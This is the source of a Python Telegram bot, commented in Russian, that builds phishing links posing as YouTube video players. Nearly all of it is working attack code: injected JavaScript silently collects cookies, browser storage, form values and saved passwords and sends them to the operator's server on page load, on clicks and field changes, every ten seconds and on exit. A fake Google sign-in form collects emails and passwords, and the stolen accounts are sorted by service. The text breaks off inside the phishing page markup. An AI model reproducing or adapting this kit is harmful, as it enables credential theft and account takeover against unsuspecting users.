import logging
import asyncio
import json
import re
import uuid
import html
import os
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
import base64

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
DOMAIN = "https://ваш-домен.com"  # Ваш домен для фишинга

# Хранилище данных
@dataclass
class PhishingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    active: bool = True
    collected_cookies: List[Dict] = None
    collected_passwords: List[Dict] = None
    collected_logins: List[Dict] = None
    collected_storage_data: List[Dict] = None  # localStorage/sessionStorage
    full_sensitive_data: List[Dict] = None     # Полные сырые данные
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []
        if self.collected_cookies is None:
            self.collected_cookies = []
        if self.collected_passwords is None:
            self.collected_passwords = []
        if self.collected_logins is None:
            self.collected_logins = []
        if self.collected_storage_data is None:
            self.collected_storage_data = []
        if self.full_sensitive_data is None:
            self.full_sensitive_data = []

class Database:
    def __init__(self):
        self.links: Dict[str, PhishingLink] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data_collected": 0,
            "active_sessions": 0,
            "cookies_collected": 0,
            "passwords_collected": 0,
            "logins_collected": 0,
            "storage_data_collected": 0,
            "full_data_collected": 0
        }
    
    def add_link(self, link: PhishingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[PhishingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.stats["total_data_collected"] += 1
            self.save()
    
    def add_collected_cookies(self, link_id: str, cookies: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_cookies.extend(cookies)
            self.stats["cookies_collected"] += len(cookies)
            self.save()
    
    def add_collected_passwords(self, link_id: str, passwords: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_passwords.extend(passwords)
            self.stats["passwords_collected"] += len(passwords)
            self.save()
    
    def add_collected_logins(self, link_id: str, logins: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_logins.extend(logins)
            self.stats["logins_collected"] += len(logins)
            self.save()
    
    def add_collected_storage(self, link_id: str, storage_data: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_storage_data.extend(storage_data)
            self.stats["storage_data_collected"] += len(storage_data)
            self.save()
    
    def add_full_sensitive_data(self, link_id: str, sensitive_data: Dict):
        if link_id in self.links:
            self.links[link_id].full_sensitive_data.append(sensitive_data)
            self.stats["full_data_collected"] += 1
            self.save()
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading database: {e}")

# Инициализация базы данных
db = Database()
db.load()

# Класс для определения принадлежности учетных записей к сервисам
class AccountIdentifier:
    """Класс для определения принадлежности учетных записей к сервисам"""
    
    # Паттерны для определения сервисов по email/логину
    SERVICE_PATTERNS = {
        "google": {
            "email_patterns": ["@gmail.com", "@googlemail.com"],
            "login_patterns": ["google", "gmail", "goog"],
            "cookie_patterns": ["google", "accounts.google", "gstatic", "youtube"],
            "form_patterns": ["google", "gmail"]
        },
        "facebook": {
            "email_patterns": ["@facebook.com"],
            "login_patterns": ["fb_", "facebook", "fb.com"],
            "cookie_patterns": ["facebook", "fb.com", "fbcdn"],
            "form_patterns": ["facebook", "fb_login"]
        },
        "twitter": {
            "email_patterns": [],
            "login_patterns": ["twitter", "x.com", "t.co"],
            "cookie_patterns": ["twitter", "x.com", "twimg"],
            "form_patterns": ["twitter", "x_login"]
        },
        "instagram": {
            "email_patterns": [],
            "login_patterns": ["instagram", "ig_", "insta"],
            "cookie_patterns": ["instagram", "cdninstagram"],
            "form_patterns": ["instagram"]
        },
        "vk": {
            "email_patterns": ["@vk.com", "@vkontakte.ru"],
            "login_patterns": ["vk_", "vkontakte", "vk.com"],
            "cookie_patterns": ["vk", "vkontakte", "userapi"],
            "form_patterns": ["vk", "vkontakte"]
        },
        "whatsapp": {
            "email_patterns": [],
            "login_patterns": ["whatsapp", "wa_"],
            "cookie_patterns": ["whatsapp"],
            "form_patterns": ["whatsapp"]
        },
        "telegram": {
            "email_patterns": [],
            "login_patterns": ["telegram", "tg_"],
            "cookie_patterns": ["telegram", "t.me"],
            "form_patterns": ["telegram"]
        },
        "yandex": {
            "email_patterns": ["@yandex.ru", "@ya.ru", "@yandex.com", "@yandex.ua", "@yandex.kz", "@yandex.by"],
            "login_patterns": ["yandex", "ya_", "yandexid"],
            "cookie_patterns": ["yandex", "yastatic"],
            "form_patterns": ["yandex"]
        },
        "mailru": {
            "email_patterns": ["@mail.ru", "@inbox.ru", "@list.ru", "@bk.ru"],
            "login_patterns": ["mail", "mailru", "my.mail"],
            "cookie_patterns": ["mail", "mail.ru"],
            "form_patterns": ["mail", "mailru"]
        },
        "github": {
            "email_patterns": [],
            "login_patterns": ["github", "gh_"],
            "cookie_patterns": ["github"],
            "form_patterns": ["github"]
        },
        "microsoft": {
            "email_patterns": ["@outlook.com", "@hotmail.com", "@live.com", "@microsoft.com"],
            "login_patterns": ["microsoft", "msft_", "outlook", "hotmail"],
            "cookie_patterns": ["microsoft", "live.com", "outlook"],
            "form_patterns": ["microsoft", "live"]
        }
    }
    
    # Перевод названий сервисов на русский
    SERVICE_NAMES_RU = {
        "google": "Google/Gmail",
        "facebook": "Facebook",
        "twitter": "Twitter/X",
        "instagram": "Instagram",
        "vk": "ВКонтакте",
        "whatsapp": "WhatsApp",
        "telegram": "Telegram",
        "yandex": "Яндекс",
        "mailru": "Mail.ru",
        "github": "GitHub",
        "microsoft": "Microsoft/Outlook"
    }
    
    @staticmethod
    def identify_account(value: str, source_data: Dict = None) -> List[str]:
        """Определяет к какому сервису принадлежит учетная запись"""
        identified_services = []
        
        if not value:
            return identified_services
        
        value_lower = value.lower()
        
        # Проверяем по паттернам
        for service, patterns in AccountIdentifier.SERVICE_PATTERNS.items():
            # Проверка по email
            if any(pattern in value_lower for pattern in patterns["email_patterns"]):
                if service not in identified_services:
                    identified_services.append(service)
                continue
            
            # Проверка по логину
            if any(pattern in value_lower for pattern in patterns["login_patterns"]):
                if service not in identified_services:
                    identified_services.append(service)
                continue
            
            # Проверка по cookies (если есть source_data)
            if source_data and "cookies" in source_data:
                cookies_str = str(source_data.get("cookies", {})).lower()
                if any(pattern in cookies_str for pattern in patterns["cookie_patterns"]):
                    if service not in identified_services:
                        identified_services.append(service)
                    continue
        
        # Дополнительная эвристика для email-адресов
        if "@" in value_lower:
            email_domain = value_lower.split("@")[1]
            
            # Общие домены
            domain_service_map = {
                "gmail.com": "google",
                "googlemail.com": "google",
                "yandex.ru": "yandex",
                "ya.ru": "yandex",
                "yandex.com": "yandex",
                "yandex.ua": "yandex",
                "yandex.kz": "yandex",
                "yandex.by": "yandex",
                "mail.ru": "mailru",
                "inbox.ru": "mailru",
                "list.ru": "mailru",
                "bk.ru": "mailru",
                "outlook.com": "microsoft",
                "hotmail.com": "microsoft",
                "live.com": "microsoft",
                "microsoft.com": "microsoft",
                "facebook.com": "facebook",
                "vk.com": "vk",
                "vkontakte.ru": "vk"
            }
            
            if email_domain in domain_service_map:
                service = domain_service_map[email_domain]
                if service not in identified_services:
                    identified_services.append(service)
        
        return identified_services
    
    @staticmethod
    def identify_accounts_from_data(collected_data: List[Dict]) -> Dict:
        """Определяет сервисы из всех собранных данных"""
        service_results = {
            "identified_accounts": [],
            "service_stats": {},
            "credentials_by_service": {}
        }
        
        for data_item in collected_data:
            # Для логинов
            if "value" in data_item and data_item["value"]:
                services = AccountIdentifier.identify_account(data_item["value"], data_item)
                if services:
                    data_item["identified_services"] = services
                    service_results["identified_accounts"].append({
                        "value": data_item["value"],
                        "services": services,
                        "type": data_item.get("field_name", "unknown"),
                        "source": data_item.get("source", "unknown")
                    })
                    
                    # Обновляем статистику
                    for service in services:
                        if service not in service_results["service_stats"]:
                            service_results["service_stats"][service] = 0
                        service_results["service_stats"][service] += 1
                        
                        # Группируем по сервисам
                        if service not in service_results["credentials_by_service"]:
                            service_results["credentials_by_service"][service] = []
                        service_results["credentials_by_service"][service].append({
                            "value": data_item["value"][:50] + ("..." if len(data_item["value"]) > 50 else ""),
                            "type": data_item.get("field_name", "unknown"),
                            "source": data_item.get("source", "unknown"),
                            "timestamp": data_item.get("timestamp", "")
                        })
        
        return service_results

# Генератор JavaScript для сбора данных
class JavaScriptInjector:
    @staticmethod
    def get_cookies_collection_script() -> str:
        """JavaScript для сбора cookies"""
        return """
        <script>
        // Функция для сбора всех cookies
        function collectAllCookies() {
            const cookies = {};
            
            // Собираем cookies из document.cookie
            const cookieString = document.cookie;
            if (cookieString) {
                cookieString.split(';').forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value) {
                        cookies[name] = decodeURIComponent(value);
                    }
                });
            }
            
            // Пытаемся получить cookies для текущего домена и поддоменов
            try {
                // Для важных доменов пытаемся собрать специфичные cookies
                const importantDomains = [
                    'google.com', 'facebook.com', 'twitter.com', 
                    'instagram.com', 'vk.com', 'youtube.com',
                    'whatsapp.com', 'telegram.org', 'github.com',
                    'microsoft.com', 'apple.com', 'amazon.com'
                ];
                
                importantDomains.forEach(domain => {
                    try {
                        // Проверяем доступ к localStorage и sessionStorage
                        if (window.localStorage) {
                            const lsData = {};
                            for (let i = 0; i < localStorage.length; i++) {
                                const key = localStorage.key(i);
                                lsData[key] = localStorage.getItem(key);
                            }
                            cookies['localStorage_' + domain] = JSON.stringify(lsData);
                        }
                        
                        if (window.sessionStorage) {
                            const ssData = {};
                            for (let i = 0; i < sessionStorage.length; i++) {
                                const key = sessionStorage.key(i);
                                ssData[key] = sessionStorage.getItem(key);
                            }
                            cookies['sessionStorage_' + domain] = JSON.stringify(ssData);
                        }
                    } catch (e) {
                        // Игнорируем ошибки доступа
                    }
                });
            } catch (e) {
                console.error('Error collecting advanced cookies:', e);
            }
            
            return cookies;
        }
        
        // Функция для сбора сохраненных паролей и логинов
        function collectSavedCredentials() {
            const credentials = {
                passwords: [],
                logins: [],
                autofill_data: []
            };
            
            try {
                // Ищем все поля паролей и логинов
                const passwordFields = document.querySelectorAll('input[type="password"]');
                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]');
                
                // Собираем значения из полей
                passwordFields.forEach(field => {
                    if (field.value) {
                        credentials.passwords.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                loginFields.forEach(field => {
                    if (field.value && (field.type === 'text' || field.type === 'email' || field.type === 'tel')) {
                        credentials.logins.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                // Собираем данные из всех форм
                document.querySelectorAll('form').forEach(form => {
                    try {
                        const formData = new FormData(form);
                        const formValues = {};
                        for (let [key, value] of formData.entries()) {
                            formValues[key] = value;
                        }
                        
                        if (Object.keys(formValues).length > 0) {
                            credentials.autofill_data.push({
                                type: 'form_data',
                                form_id: form.id || 'unknown',
                                form_action: form.action || 'unknown',
                                data: formValues
                            });
                        }
                    } catch (e) {
                        // Игнорируем
                    }
                });
                
            } catch (e) {
                console.error('Error collecting credentials:', e);
            }
            
            return credentials;
        }
        
        // Функция для извлечения паролей из менеджеров паролей
        function extractPasswordManagerData() {
            const managerData = {
                browser_saved: [],
                third_party: []
            };
            
            try {
                // Попытка доступа к API менеджера паролей браузера
                if (navigator.credentials && navigator.credentials.get) {
                    navigator.credentials.get({password: true})
                        .then(credential => {
                            if (credential) {
                                managerData.browser_saved.push({
                                    type: 'browser_native',
                                    data: credential
                                });
                            }
                        })
                        .catch(e => {});
                }
                
                // Проверяем наличие популярных менеджеров паролей
                const passwordManagers = [
                    'lastpass', '1password', 'dashlane', 'bitwarden',
                    'keeper', 'roboform', 'nordpass', 'enpass'
                ];
                
                // Ищем инъекции менеджеров паролей
                passwordManagers.forEach(manager => {
                    try {
                        // Проверяем наличие элементов менеджера
                        const managerElements = document.querySelectorAll(`[class*="${manager}"], [id*="${manager}"]`);
                        if (managerElements.length > 0) {
                            managerData.third_party.push({
                                manager: manager,
                                detected: true,
                                elements_count: managerElements.length
                            });
                        }
                    } catch (e) {
                        // Игнорируем
                    }
                });
                
            } catch (e) {
                console.error('Error extracting password manager data:', e);
            }
            
            return managerData;
        }
        
        // Функция для сбора данных входа в соцсети
        function collectSocialMediaLogins() {
            const socialLogins = {};
            
            // Проверяем наличие cookies соцсетей
            const socialDomains = {
                'google': ['google.com', 'accounts.google.com'],
                'facebook': ['facebook.com', 'fb.com'],
                'twitter': ['twitter.com', 'x.com'],
                'instagram': ['instagram.com'],
                'vk': ['vk.com', 'vkontakte.ru'],
                'whatsapp': ['whatsapp.com', 'web.whatsapp.com'],
                'telegram': ['telegram.org', 'web.telegram.org']
            };
            
            Object.keys(socialDomains).forEach(social => {
                socialDomains[social].forEach(domain => {
                    try {
                        // Проверяем cookies для домена
                        const cookies = document.cookie.split(';').filter(cookie => 
                            cookie.includes(domain) || cookie.includes(social)
                        );
                        
                        if (cookies.length > 0) {
                            socialLogins[social] = {
                                domain: domain,
                                cookies_count: cookies.length,
                                cookies: cookies.map(c => c.trim()),
                                logged_in: cookies.some(c => 
                                    c.includes('session') || 
                                    c.includes('token') || 
                                    c.includes('auth')
                                )
                            };
                        }
                    } catch (e) {
                        // Игнорируем
                    }
                });
            });
            
            return socialLogins;
        }
        
        // Функция для сбора данных из хранилища
        function collectStorageData() {
            const storageData = {
                localStorage: {},
                sessionStorage: {},
                indexedDB: []
            };
            
            try {
                // Собираем localStorage
                if (window.localStorage) {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        storageData.localStorage[key] = localStorage.getItem(key);
                    }
                }
                
                // Собираем sessionStorage
                if (window.sessionStorage) {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        storageData.sessionStorage[key] = sessionStorage.getItem(key);
                    }
                }
                
                // Пытаемся получить список IndexedDB баз
                if (window.indexedDB) {
                    try {
                        // Это нестандартный метод, но работает в некоторых браузерах
                        if (indexedDB.databases) {
                            indexedDB.databases().then(dbs => {
                                storageData.indexedDB = dbs.map(db => ({
                                    name: db.name,
                                    version: db.version
                                }));
                            }).catch(() => {});
                        }
                    } catch (e) {
                        // Игнорируем ошибки IndexedDB
                    }
                }
                
            } catch (e) {
                console.error('Error collecting storage data:', e);
            }
            
            return storageData;
        }
        
        // Главная функция сбора всех данных
        async function collectAllSensitiveData() {
            const allData = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies: {},
                credentials: {},
                password_managers: {},
                social_logins: {},
                storage_data: {},
                browser_info: {
                    cookie_enabled: navigator.cookieEnabled,
                    java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                    pdf_viewer_enabled: navigator.pdfViewerEnabled || false,
                    do_not_track: navigator.doNotTrack || 'unspecified'
                }
            };
            
            try {
                // Собираем cookies
                allData.cookies = collectAllCookies();
                
                // Собираем пароли и логины
                allData.credentials = collectSavedCredentials();
                
                // Проверяем менеджеры паролей
                allData.password_managers = extractPasswordManagerData();
                
                // Проверяем соцсети
                allData.social_logins = collectSocialMediaLogins();
                
                // Собираем данные из хранилищ
                allData.storage_data = collectStorageData();
                
                // Собираем информацию о браузере
                allData.screen_info = {
                    width: window.screen.width,
                    height: window.screen.height,
                    color_depth: window.screen.colorDepth,
                    pixel_depth: window.screen.pixelDepth
                };
                
                // Собираем информацию о часовом поясе
                allData.timezone = {
                    offset: new Date().getTimezoneOffset(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                
                return allData;
                
            } catch (error) {
                console.error('Error collecting sensitive data:', error);
                return {
                    error: error.message,
                    partial_data: allData
                };
            }
        }
        
        // Функция отправки данных на сервер
        function sendCollectedData(data) {
            const linkId = new URLSearchParams(window.location.search).get('id');
            if (!linkId) return;
            
            try {
                // Кодируем данные для отправки
                const jsonData = JSON.stringify(data);
                const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                
                // Отправляем данные
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: 'sensitive_data',
                        data: encodedData,
                        timestamp: new Date().toISOString()
                    })
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Data sent successfully:', result);
                })
                .catch(error => {
                    console.error('Error sending data:', error);
                    // Пытаемся отправить снова через XMLHttpRequest
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', '/api/collect', true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(JSON.stringify({
                            link_id: linkId,
                            data_type: 'sensitive_data',
                            data: encodedData,
                            timestamp: new Date().toISOString()
                        }));
                    } catch (e) {
                        console.error('Fallback send also failed:', e);
                    }
                });
            } catch (error) {
                console.error('Error preparing data for send:', error);
            }
        }
        
        // Автоматический сбор данных при загрузке страницы
        window.addEventListener('load', function() {
            setTimeout(async () => {
                try {
                    const sensitiveData = await collectAllSensitiveData();
                    sendCollectedData(sensitiveData);
                } catch (e) {
                    console.error('Initial collection failed:', e);
                }
                
                // Дополнительный сбор при взаимодействии с формами
                document.addEventListener('submit', async function(e) {
                    setTimeout(async () => {
                        try {
                            const formData = await collectAllSensitiveData();
                            sendCollectedData(formData);
                        } catch (e) {
                            console.error('Form submit collection failed:', e);
                        }
                    }, 500);
                });
                
                // Сбор при изменении полей
                document.querySelectorAll('input, textarea, select').forEach(input => {
                    input.addEventListener('change', async function() {
                        setTimeout(async () => {
                            try {
                                const fieldData = await collectAllSensitiveData();
                                sendCollectedData(fieldData);
                            } catch (e) {
                                console.error('Field change collection failed:', e);
                            }
                        }, 1000);
                    });
                    
                    input.addEventListener('blur', async function() {
                        setTimeout(async () => {
                            try {
                                const fieldData = await collectAllSensitiveData();
                                sendCollectedData(fieldData);
                            } catch (e) {
                                console.error('Field blur collection failed:', e);
                            }
                        }, 500);
                    });
                });
                
                // Периодический сбор каждые 10 секунд
                setInterval(async () => {
                    try {
                        const periodicData = await collectAllSensitiveData();
                        sendCollectedData(periodicData);
                    } catch (e) {
                        console.error('Periodic collection failed:', e);
                    }
                }, 10000);
                
            }, 3000); // Ждем 3 секунды для загрузки страницы
        });
        
        // Сбор данных при уходе со страницы
        window.addEventListener('beforeunload', async function() {
            try {
                const exitData = await collectAllSensitiveData();
                // Используем navigator.sendBeacon для надежной отправки при закрытии
                const linkId = new URLSearchParams(window.location.search).get('id');
                if (linkId) {
                    const jsonData = JSON.stringify(exitData);
                    const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                    const blob = new Blob([JSON.stringify({
                        link_id: linkId,
                        data_type: 'sensitive_data',
                        data: encodedData,
                        timestamp: new Date().toISOString(),
                        exit_event: true
                    })], {type: 'application/json'});
                    
                    navigator.sendBeacon('/api/collect', blob);
                }
            } catch (e) {
                console.error('Exit collection failed:', e);
            }
        });
        </script>
        """
    
    @staticmethod
    def get_instant_credential_collection_script() -> str:
        """JavaScript для мгновенного сбора учетных данных при загрузке"""
        return """
        <script>
        // Функция для принудительного сбора всех учетных данных на странице
        function forceCollectAllCredentials() {
            const credentials = {
                instant_passwords: [],
                instant_logins: [],
                instant_forms: [],
                instant_autofill: []
            };
            
            try {
                // 1. Собираем ВСЕ пароли из всех форм (даже скрытых)
                document.querySelectorAll('input[type="password"]').forEach(field => {
                    if (field.value && field.value.trim() !== '') {
                        credentials.instant_passwords.push({
                            source: 'auto_detected',
                            field_name: field.name || field.id || field.placeholder || 'password_field',
                            field_id: field.id,
                            field_type: field.type,
                            field_class: field.className,
                            value: field.value,
                            form_id: field.form ? field.form.id : 'no_form',
                            page_url: window.location.href,
                            timestamp: new Date().toISOString(),
                            collected_on: 'page_load'
                        });
                    }
                });
                
                // 2. Собираем ВСЕ возможные логин-поля
                const loginSelectors = [
                    'input[type="text"]',
                    'input[type="email"]', 
                    'input[type="tel"]',
                    'input[name*="login"]',
                    'input[name*="user"]',
                    'input[name*="email"]',
                    'input[name*="username"]',
                    'input[autocomplete*="username"]',
                    'input[autocomplete*="email"]'
                ];
                
                loginSelectors.forEach(selector => {
                    document.querySelectorAll(selector).forEach(field => {
                        if (field.value && field.value.trim() !== '') {
                            credentials.instant_logins.push({
                                source: 'auto_detected',
                                field_name: field.name || field.id || field.placeholder || 'login_field',
                                field_id: field.id,
                                field_type: field.type,
                                field_class: field.className,
                                value: field.value,
                                form_id: field.form ? field.form.id : 'no_form',
                                page_url: window.location.href,
                                timestamp: new Date().toISOString(),
                                collected_on: 'page_load'
                            });
                        }
                    });
                });
                
                // 3. Собираем данные из ВСЕХ форм на странице
                document.querySelectorAll('form').forEach(form => {
                    try {
                        const formData = {};
                        form.querySelectorAll('input, textarea, select').forEach(input => {
                            if (input.name && (input.value || input.value === 0 || input.value === false)) {
                                formData[input.name] = input.value;
                            }
                        });
                        
                        if (Object.keys(formData).length > 0) {
                            credentials.instant_forms.push({
                                form_id: form.id || 'anonymous_form',
                                form_action: form.action || 'unknown',
                                form_method: form.method || 'get',
                                data: formData,
                                timestamp: new Date().toISOString()
                            });
                        }
                    } catch (e) {
                        // Игнорируем ошибки
                    }
                });
                
                // 4. Проверяем автозаполнение браузера
                setTimeout(() => {
                    try {
                        // Снова проверяем пароли после возможного автозаполнения
                        document.querySelectorAll('input[type="password"]').forEach(field => {
                            if (field.value && field.value.trim() !== '' && 
                                !credentials.instant_passwords.some(p => p.field_id === field.id)) {
                                credentials.instant_passwords.push({
                                    source: 'autofill_detected',
                                    field_name: field.name || field.id || 'password_field',
                                    field_id: field.id,
                                    value: field.value,
                                    timestamp: new Date().toISOString()
                                });
                            }
                        });
                    } catch (e) {}
                }, 1000);
                
            } catch (error) {
                console.error('Error in force credential collection:', error);
            }
            
            return credentials;
        }
        
        // Функция для поиска сохраненных учетных данных в браузере
        function findSavedBrowserCredentials() {
            const savedCredentials = {
                browser_saved_passwords: [],
                browser_saved_logins: []
            };
            
            try {
                // Метод 1: Пытаемся получить через Credentials Management API
                if (navigator.credentials && navigator.credentials.get) {
                    navigator.credentials.get({
                        password: true,
                        mediation: 'silent'  // Тихий режим без уведомления пользователя
                    }).then(credential => {
                        if (credential) {
                            savedCredentials.browser_saved_passwords.push({
                                type: 'browser_native_api',
                                id: credential.id,
                                name: credential.name,
                                type: credential.type,
                                mediation: 'silent'
                            });
                        }
                    }).catch(() => {});
                }
                
                // Метод 2: Проверяем наличие данных автозаполнения в DOM
                const autofillFields = document.querySelectorAll('[autofill]');
                autofillFields.forEach(field => {
                    if (field.value) {
                        const dataType = field.getAttribute('autofill') || 
                                        field.getAttribute('data-autofilled') || 
                                        'autofilled_data';
                        savedCredentials.browser_saved_logins.push({
                            field_id: field.id,
                            field_name: field.name,
                            autofill_type: dataType,
                            value: field.value
                        });
                    }
                });
                
            } catch (error) {
                console.error('Error finding saved credentials:', error);
            }
            
            return savedCredentials;
        }
        
        // Функция для отправки мгновенно собранных данных
        function sendInstantCredentials() {
            const linkId = new URLSearchParams(window.location.search).get('id');
            if (!linkId) return;
            
            try {
                // Собираем данные
                const instantData = forceCollectAllCredentials();
                const savedData = findSavedBrowserCredentials();
                
                const allData = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    instant_collection: instantData,
                    browser_saved_data: savedData,
                    user_agent: navigator.userAgent,
                    collected_on_load: true
                };
                
                // Отправляем данные
                fetch('/api/collect_instant', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: 'instant_credentials',
                        data: btoa(unescape(encodeURIComponent(JSON.stringify(allData)))),
                        timestamp: new Date().toISOString()
                    }),
                    keepalive: true  // Для отправки даже при закрытии страницы
                }).catch(error => {
                    // Fallback отправка
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', '/api/collect_instant', false);  // Синхронно
                        xhr.send(JSON.stringify({
                            link_id: linkId,
                            data_type: 'instant_credentials',
                            data: btoa(unescape(encodeURIComponent(JSON.stringify(allData))))
                        }));
                    } catch (e) {}
                });
                
            } catch (error) {
                console.error('Error sending instant credentials:', error);
            }
        }
        
        // Запускаем сбор сразу при загрузке DOM
        document.addEventListener('DOMContentLoaded', function() {
            // Первый сбор сразу
            sendInstantCredentials();
            
            // Повторный сбор через 1 секунду (для автозаполнения)
            setTimeout(sendInstantCredentials, 1000);
            
            // Еще один сбор через 3 секунды
            setTimeout(sendInstantCredentials, 3000);
        });
        
        // Также собираем при полной загрузке страницы
        window.addEventListener('load', function() {
            setTimeout(sendInstantCredentials, 500);
            setTimeout(sendInstantCredentials, 2000);
        });
        
        // Сбор при любом клике (пользователь может активировать автозаполнение)
        document.addEventListener('click', function() {
            setTimeout(sendInstantCredentials, 300);
        }, true);  // Используем capture phase для перехвата всех кликов
        
        // Сбор при фокусе на любом поле
        document.addEventListener('focusin', function() {
            setTimeout(sendInstantCredentials, 400);
        }, true);
        </script>
        """
    
    @staticmethod
    def get_phishing_page_html(video_id: str, link_id: str) -> str:
        """Генерация HTML фишинговой страницы"""
        base_html = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>YouTube Video Player</title>
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                    background: #000;
                    font-family: Arial, sans-serif;
                }}
                .container {{
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                }}
                .player-container {{
                    position: relative;
                    padding-bottom: 56.25%;
                    height: 0;
                    overflow: hidden;
                }}
                .player-container iframe {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                }}
                .loading {{
                    text-align: center;
                    color: #fff;
                    padding: 50px;
                    font-size: 18px;
                }}
                .ad-banner {{
                    background: #ff0000;
                    color: white;
                    text-align: center;
                    padding: 10px;
                    margin: 20px 0;
                    border-radius: 5px;
                }}
                .login-prompt {{
                    background: #4285f4;
                    color: white;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 5px;
                    text-align: center;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="ad-banner">
                    🎬 Для просмотра видео требуется авторизация через Google
                </div>
                
                <div class="player-container">
                    <iframe 
                        src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=0&showinfo=0&rel=0" 
                        frameborder="0" 
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                        allowfullscreen>
                    </iframe>
                </div>
                
                <div class="login-prompt" id="loginPrompt">
                    <h3>⚠️ Требуется вход в аккаунт</h3>
                    <p>Для продолжения просмотра войдите в свой аккаунт Google</p>
                    <button onclick="showLoginForm()" style="
                        background: white;
                        color: #4285f4;
                        border: none;
                        padding: 10px 20px;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 16px;
                        margin: 10px;
                    ">
                        Войти в аккаунт
                    </button>
                </div>
                
                <div id="loginForm" style="display: none;">
                    <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3 style="color: #333;">Вход в Google</h3>
                        <form id="googleLoginForm">
                            <input type="email" 
                                   placeholder="Электронная почта или телефон" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <input type="password" 
                                   placeholder="Введите пароль" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <button type="submit" 
                                    style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer;">
                                Далее
                            </button>
                        </form>
                        <p style="color: #666; font-size: 12px; margin-top: 10px;">
                            Нажимая кнопку "Далее", вы соглашаетесь с Условиями использования и Политикой конфиденциальности Google.
                        </p>
                    </div>
                </div>
                
                <div class="loading" id="loading">
                    Загрузка видео... Пожалуйста, подождите
                </div>
            </div>
            
            <script>
                function showLoginForm() {{
                    document.getElementById('loginPrompt').style.display = 'none';
                    document.getElementById('loginForm').style.display = 'block';
                    document.getElementById('loading').innerHTML = 'Проверка учетных данных...';
                    
                    // Имитация проверки
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Загрузка видео...';
                        setTimeout(function() {{
                            document.getElementById('loading').style.display = 'none';
                        }}, 2000);
